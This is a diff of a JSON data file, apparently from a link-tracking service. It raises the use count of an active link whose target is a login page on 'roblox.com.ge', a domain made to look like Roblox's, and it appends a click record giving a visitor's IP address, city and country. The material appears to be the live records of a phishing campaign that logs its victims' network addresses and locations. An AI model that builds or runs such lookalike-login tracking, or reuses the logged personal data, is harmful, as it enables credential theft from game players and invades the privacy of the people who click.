@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1493,
+    "useCount": 1494,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12112,6 +12112,14 @@
         "city": "Tampa",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777441569307,
+        "ip": "138.84.72.144",
+        "country": "Philippines",
+        "city": "Tarlac City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
